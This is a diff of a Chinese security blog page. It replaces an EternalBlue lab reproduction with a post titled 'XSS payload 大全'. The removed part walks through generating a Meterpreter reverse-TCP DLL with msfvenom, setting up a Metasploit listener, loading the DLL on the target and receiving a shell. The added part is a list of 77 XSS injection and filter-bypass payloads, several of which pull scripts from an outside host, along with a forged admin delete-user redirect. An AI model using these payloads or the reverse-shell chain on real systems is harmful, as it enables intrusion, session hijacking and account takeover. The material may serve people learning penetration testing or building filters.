@@ -61,25 +61,14 @@
 
 <meta name="description" content="点击阅读全文">
 <meta property="og:type" content="article">
-<meta property="og:title" content="方程式 0day Eternalblue复现">
-<meta property="og:url" content="http://uknowsec.cn/posts/notes/方程式-0day-Eternalblue复现.html">
+<meta property="og:title" content="xss payload 大全">
+<meta property="og:url" content="http://uknowsec.cn/posts/notes/xss-payload-大全.html">
 <meta property="og:site_name" content="Uknow’s Blog">
 <meta property="og:description" content="点击阅读全文">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526102843.jpg">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101141.jpg">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526100922.jpg">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101041.jpg">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101328.jpg">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101230.jpg">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101328.jpg">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101109.jpg">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/_ZC1FX3$WP%5DCML2JTF8MMTT.png">
-<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/~X%7D5U%7D5VQO@OPK%5BN$5~_Y%5DG.png">
-<meta property="og:updated_time" content="2017-05-26T02:57:26.682Z">
+<meta property="og:updated_time" content="2017-07-11T05:20:37.482Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="方程式 0day Eternalblue复现">
+<meta name="twitter:title" content="xss payload 大全">
 <meta name="twitter:description" content="点击阅读全文">
-<meta name="twitter:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526102843.jpg">
 
 
 
@@ -97,7 +86,7 @@
   };
 </script>
 
-  <title> 方程式 0day Eternalblue复现 | Uknow’s Blog </title>
+  <title> xss payload 大全 | Uknow’s Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -260,7 +249,7 @@ var _hmt = _hmt || [];
             
             
               
-                方程式 0day Eternalblue复现
+                xss payload 大全
               
             
           </h1>
@@ -272,8 +261,8 @@ var _hmt = _hmt || [];
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2017-05-26T10:19:34+08:00" content="2017-05-26">
-              2017-05-26
+            <time itemprop="dateCreated" datetime="2017-07-11T13:20:00+08:00" content="2017-07-11">
+              2017-07-11
             </time>
           </span>
 
@@ -302,8 +291,8 @@ var _hmt = _hmt || [];
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/posts/notes/方程式-0day-Eternalblue复现.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="posts/notes/方程式-0day-Eternalblue复现.html" itemprop="commentsCount"></span>
+                <a href="/posts/notes/xss-payload-大全.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="posts/notes/xss-payload-大全.html" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -313,7 +302,7 @@ var _hmt = _hmt || [];
 
           
           
-             <span id="/posts/notes/方程式-0day-Eternalblue复现.html" class="leancloud_visitors" data-flag-title="方程式 0day Eternalblue复现">
+             <span id="/posts/notes/xss-payload-大全.html" class="leancloud_visitors" data-flag-title="xss payload 大全">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -335,40 +324,7 @@ var _hmt = _hmt || [];
 
       
         <p>点击阅读全文<br><a id="more"></a></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨天去学长公司了，在公司呆了一下午。其间学长的同事让我复现下方程式Eternalblue，但是由于我没有带电脑所以没有在那边进行复现。Eternalblue之前我是有复现过的，那时候是用吐司上别人发的MSF集成的脚本。但是好像是成功了，回来打开KALI还看到之前的成功记录。这次再次进行一次复现，在这个过程中，一开始我是按照学长同事给的freebuf上的一篇文章来的，但是我最初下载的Empire是最新版的，然后在配置listeners的过程中出现错误，不能配置。无奈在他人的提醒下下载了1.6版本但是由于之前安装了最新版的问题，1.6无法安装。所以只能直接用msf进行监听了。</p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">攻击机 ： 10.15.17.215</div><div class="line">win7 32bit 旗舰版</div><div class="line">python-2.6.6.msi</div><div class="line">https://www.python.org/download/releases/2.6.6/</div><div class="line">pywin32-221.win32-py2.6.exe</div><div class="line">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526102843.jpg" alt=""></p>
-<h3 id="监听机"><a href="#监听机" class="headerlink" title="监听机"></a>监听机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">监听机 ： 10.15.198.65</div><div class="line">KALI</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101141.jpg" alt=""></p>
-<h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">靶机 ： 10.15.251.226</div><div class="line">win 64bit en 旗舰版</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526100922.jpg" alt=""></p>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="生成DLL文件"><a href="#生成DLL文件" class="headerlink" title="生成DLL文件"></a>生成DLL文件</h3><ul>
-<li><p>在KALI下生成s.dll到apache目录下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.15.198.65 LPORT=5555 -f dll &gt; /var/www/html/s.dll</div></pre></td></tr></table></figure>
-</li>
-<li><p>启动apache服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service apache2 start</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101041.jpg" alt=""></p>
-<h3 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use exploit/mulit/handler</div><div class="line">set LHOST 10.15.198.65</div><div class="line">set LPORT 5555</div><div class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">exploit</div></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101328.jpg" alt=""></p>
-<h3 id="配置攻击脚本"><a href="#配置攻击脚本" class="headerlink" title="配置攻击脚本"></a>配置攻击脚本</h3><ul>
-<li>运行fb.py 配置攻击脚本</li>
-<li>访问KALI的web服务器下载s.dll文件复制到C盘目录</li>
-<li>加载DLL</li>
-</ul>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101230.jpg" alt=""></p>
-<h3 id="操作监听机"><a href="#操作监听机" class="headerlink" title="操作监听机"></a>操作监听机</h3><ul>
-<li>Msf里成功收到一个shell</li>
-<li>getuid</li>
-<li>ipconfig</li>
-</ul>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101328.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170526101109.jpg" alt=""></p>
-<h2 id="之前的复现图"><a href="#之前的复现图" class="headerlink" title="之前的复现图"></a>之前的复现图</h2><p>附上之前利用msf集成exp脚本测试图。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/_ZC1FX3$WP%5DCML2JTF8MMTT.png" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/~X%7D5U%7D5VQO@OPK%5BN$5~_Y%5DG.png" alt=""></p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>昨天回来后休息了一会，然后才开始复现的，等我把环境配置好的时候已经断网了。Empire最新版无法配置listeners的问题一直没有解决。早上下载1.6版本有出现了错误，需要删除最新版。但是Empire是利用.sh安装的，想要卸载干净不是那么简单的。再加上我的KALI没有快照不能还原，无奈只能直接利用MSF，不能按照freebuf上的文章进行复现。然后自己的电脑也比较渣，开三个虚拟机一卡一卡的，陆陆续续才完成这个复现过程。</p>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div></pre></td><td class="code"><pre><div class="line">(1)普通的XSS JavaScript注入</div><div class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(2)IMG标签XSS使用JavaScript命令</div><div class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(3)IMG标签无分号无引号</div><div class="line">&lt;IMG SRC=javascript:alert(‘XSS’)&gt;</div><div class="line"></div><div class="line">(4)IMG标签大小写不敏感</div><div class="line">&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;</div><div class="line"></div><div class="line">(5)HTML编码(必须有分号)</div><div class="line">&lt;IMG SRC=javascript:alert(“XSS”)&gt;</div><div class="line"></div><div class="line">(6)修正缺陷IMG标签</div><div class="line">&lt;IMG “”&quot;&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;</div><div class="line"></div><div class="line">(7)formCharCode标签(计算器)</div><div class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</div><div class="line"></div><div class="line">(8)UTF-8的Unicode编码(计算器)</div><div class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</div><div class="line"></div><div class="line">(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</div><div class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</div><div class="line"></div><div class="line">(10)十六进制编码也是没有分号(计算器)</div><div class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</div><div class="line"></div><div class="line">(11)嵌入式标签,将Javascript分开</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(12)嵌入式编码标签,将Javascript分开</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(13)嵌入式换行符</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(14)嵌入式回车</div><div class="line">&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(15)嵌入式多行注入JavaScript,这是XSS极端的例子</div><div class="line">&lt;IMG SRC=”javascript:alert(‘XSS‘)”&gt;</div><div class="line"></div><div class="line">(16)解决限制字符(要求同页面)</div><div class="line">&lt;script&gt;z=’document.’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’write(“‘&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’w.shell’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’.net/1.’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;</div><div class="line">&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt;</div><div class="line">&lt;script&gt;eval_r(z)&lt;/script&gt;</div><div class="line"></div><div class="line">(17)空字符</div><div class="line">perl -e ‘print “&lt;IMG SRC=java\0script:alert(\”XSS\”)&gt;”;’ &gt; out</div><div class="line"></div><div class="line">(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</div><div class="line">perl -e ‘print “&lt;SCR\0IPT&gt;alert(\”XSS\”)&lt;/SCR\0IPT&gt;”;’ &gt; out</div><div class="line"></div><div class="line">(19)Spaces和meta前的IMG标签</div><div class="line">&lt;IMG SRC=”   javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(20)Non-alpha-non-digit XSS</div><div class="line">&lt;SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(21)Non-alpha-non-digit XSS to 2</div><div class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt;</div><div class="line"></div><div class="line">(22)Non-alpha-non-digit XSS to 3</div><div class="line">&lt;SCRIPT/SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(23)双开括号</div><div class="line">&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(24)无结束脚本标记(仅火狐等浏览器)</div><div class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;</div><div class="line"></div><div class="line">(25)无结束脚本标记2</div><div class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</div><div class="line"></div><div class="line">(26)半开的HTML/JavaScript XSS</div><div class="line">&lt;IMG SRC=”javascript:alert(‘XSS’)”</div><div class="line"></div><div class="line">(27)双开角括号</div><div class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</div><div class="line"></div><div class="line">(28)无单引号 双引号 分号</div><div class="line">&lt;SCRIPT&gt;a=/XSS/</div><div class="line">alert(a.source)&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(29)换码过滤的JavaScript</div><div class="line">\”;alert(‘XSS’);//</div><div class="line"></div><div class="line">(30)结束Title标签</div><div class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(31)Input Image</div><div class="line">&lt;INPUT SRC=”javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(32)BODY Image</div><div class="line">&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(33)BODY标签</div><div class="line">&lt;BODY(‘XSS’)&gt;</div><div class="line"></div><div class="line">(34)IMG Dynsrc</div><div class="line">&lt;IMG DYNSRC=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(35)IMG Lowsrc</div><div class="line">&lt;IMG LOWSRC=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(36)BGSOUND</div><div class="line">&lt;BGSOUND SRC=”javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(37)STYLE sheet</div><div class="line">&lt;LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(38)远程样式表</div><div class="line">&lt;LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”&gt;</div><div class="line"></div><div class="line">(39)List-style-image(列表式)</div><div class="line">&lt;STYLE&gt;li &#123;list-style-image: url(“javascript:alert(‘XSS’)”);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</div><div class="line"></div><div class="line">(40)IMG VBscript</div><div class="line">&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</div><div class="line"></div><div class="line">(41)META链接url</div><div class="line">&lt;META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”&gt;</div><div class="line"></div><div class="line">(42)Iframe</div><div class="line">&lt;IFRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/IFRAME&gt;</div><div class="line"></div><div class="line">(43)Frame</div><div class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/FRAMESET&gt;</div><div class="line"></div><div class="line">(44)Table</div><div class="line">&lt;TABLE BACKGROUND=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(45)TD</div><div class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=”javascript:alert(‘XSS’)”&gt;</div><div class="line"></div><div class="line">(46)DIV background-image</div><div class="line">&lt;DIV STYLE=”background-image: none)”&gt;</div><div class="line"></div><div class="line">(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)</div><div class="line">&lt;DIV STYLE=”background-image: none)”&gt;</div><div class="line"></div><div class="line">(48)DIV expression</div><div class="line">&lt;DIV STYLE=”width: expression_r(alert(‘XSS’));”&gt;</div><div class="line"></div><div class="line">(49)STYLE属性分拆表达</div><div class="line">&lt;IMG STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</div><div class="line"></div><div class="line">(50)匿名STYLE(组成:开角号和一个字母开头)</div><div class="line">&lt;XSS STYLE=”xss:expression_r(alert(‘XSS’))”&gt;</div><div class="line"></div><div class="line">(51)STYLE background-image</div><div class="line">&lt;STYLE&gt;.XSS&#123;background-image:none”);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;</div><div class="line"></div><div class="line">(52)IMG STYLE方式</div><div class="line">exppression(alert(“XSS”))’&gt;</div><div class="line"></div><div class="line">(53)STYLE background</div><div class="line">&lt;STYLE&gt;&lt;STYLE type=”text/css”&gt;BODY&#123;background:url(“javascript:alert(‘XSS’)”)&#125;&lt;/STYLE&gt;</div><div class="line"></div><div class="line">(54)BASE</div><div class="line">&lt;BASE HREF=”javascript:alert(‘XSS’);//”&gt;</div><div class="line"></div><div class="line">(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS</div><div class="line">&lt;EMBED SRC=”http://3w.org/XSS/xss.swf” &gt;&lt;/EMBED&gt;</div><div class="line"></div><div class="line">(56)在flash中使用ActionScrpt可以混进你XSS的代码</div><div class="line">a=”get”;</div><div class="line">b=”URL(\”&quot;;</div><div class="line">c=”javascript:”;</div><div class="line">d=”alert(‘XSS’);\”)”;</div><div class="line">eval_r(a+b+c+d);</div><div class="line"></div><div class="line">(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上</div><div class="line">&lt;HTML xmlns:xss&gt;</div><div class="line">&lt;?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”&gt;</div><div class="line">&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;</div><div class="line">&lt;/HTML&gt;</div><div class="line"></div><div class="line">(58)如果过滤了你的JS你可以在图片里添加JS代码来利用</div><div class="line">&lt;SCRIPT SRC=””&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(59)IMG嵌入式命令,可执行任意命令</div><div class="line">&lt;IMG SRC=”http://www.XXX.com/a.php?a=b”&gt;</div><div class="line"></div><div class="line">(60)IMG嵌入式命令(a.jpg在同服务器)</div><div class="line">Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser</div><div class="line"></div><div class="line">(61)绕符号过滤</div><div class="line">&lt;SCRIPT a=”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(62)</div><div class="line">&lt;SCRIPT =”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(63)</div><div class="line">&lt;SCRIPT a=”&gt;” ” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(64)</div><div class="line">&lt;SCRIPT “a=’&gt;’” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(65)</div><div class="line">&lt;SCRIPT a=`&gt;` SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(66)</div><div class="line">&lt;SCRIPT a=”&gt;’&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(67)</div><div class="line">&lt;SCRIPT&gt;document.write(“&lt;SCRI”);&lt;/SCRIPT&gt;PT SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;</div><div class="line"></div><div class="line">(68)URL绕行</div><div class="line">&lt;A HREF=”http://127.0.0.1/”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(69)URL编码</div><div class="line">&lt;A HREF=”http://3w.org”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(70)IP十进制</div><div class="line">&lt;A HREF=”http://3232235521″&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(71)IP十六进制</div><div class="line">&lt;A HREF=”http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(72)IP八进制</div><div class="line">&lt;A HREF=”http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(73)混合编码</div><div class="line">&lt;A HREF=”h</div><div class="line">tt p://6 6.000146.0×7.147/”&quot;&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(74)节省[http:]</div><div class="line">&lt;A HREF=”//www.google.com/”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(75)节省[www]</div><div class="line">&lt;A HREF=”http://google.com/”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(76)绝对点绝对DNS</div><div class="line">&lt;A HREF=”http://www.google.com./”&gt;XSS&lt;/A&gt;</div><div class="line"></div><div class="line">(77)javascript链接</div><div class="line">&lt;A HREF=”javascript:document.location=’http://www.google.com/’”&gt;XSS&lt;/A&gt;</div></pre></td></tr></table></figure>
       
     </div>
 
@@ -385,17 +341,13 @@ var _hmt = _hmt || [];
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/posts/notes/python编程实践学习-模拟登录爬取信息.html" rel="next" title="Python编程实践学习--模拟登录爬取信息">
-                <i class="fa fa-chevron-left"></i> Python编程实践学习--模拟登录爬取信息
+              <a href="/posts/notes/理解php序列化漏洞.html" rel="next" title="理解php序列化漏洞">
+                <i class="fa fa-chevron-left"></i> 理解php序列化漏洞
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/posts/notes/理解php序列化漏洞.html" rel="prev" title="理解php序列化漏洞">
-                理解php序列化漏洞 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -444,8 +396,8 @@ var _hmt = _hmt || [];
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="posts/notes/方程式-0day-Eternalblue复现.html"
-           data-title="方程式 0day Eternalblue复现" data-url="http://uknowsec.cn/posts/notes/方程式-0day-Eternalblue复现.html">
+      <div class="ds-thread" data-thread-key="posts/notes/xss-payload-大全.html"
+           data-title="xss payload 大全" data-url="http://uknowsec.cn/posts/notes/xss-payload-大全.html">
       </div>
     
   </div>
@@ -567,7 +519,7 @@ var _hmt = _hmt || [];
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境准备"><span class="nav-number">2.1.</span> <span class="nav-text">环境准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击机"><span class="nav-number">2.1.1.</span> <span class="nav-text">攻击机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#监听机"><span class="nav-number">2.1.2.</span> <span class="nav-text">监听机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#靶机"><span class="nav-number">2.1.3.</span> <span 